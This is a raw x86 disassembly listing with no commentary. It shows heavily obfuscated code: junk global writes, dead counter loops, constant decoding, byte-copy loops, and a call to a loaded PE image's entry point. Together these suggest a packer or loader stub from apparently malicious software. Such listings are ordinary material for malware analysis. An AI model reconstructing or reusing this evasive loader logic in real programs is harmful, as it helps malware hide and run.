  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d76,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c66
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x423992
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c66
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e82
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c66
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42385f
  41bc20:	push   0x423893
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e82,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c66
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x4238de
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x423893
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423956
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c66
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421aea,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421d3e,eax
  41c15b:	mov    eax,ds:0x421aea
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c66
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421d3e
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421aea
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c66
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c66
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c66
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421cea,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421ce2,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c66
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x4237f2
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
